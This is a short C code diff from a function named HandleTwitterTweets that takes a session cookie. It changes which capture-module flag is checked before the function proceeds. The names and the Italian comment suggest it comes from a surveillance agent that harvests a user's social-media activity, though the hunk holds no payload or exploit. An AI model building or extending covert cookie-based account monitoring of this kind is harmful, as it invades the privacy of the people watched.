@@ -246,7 +246,7 @@ DWORD HandleTwitterTweets(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_MailCapStarted)
+	if (!bPM_IMStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Identifica l'utente
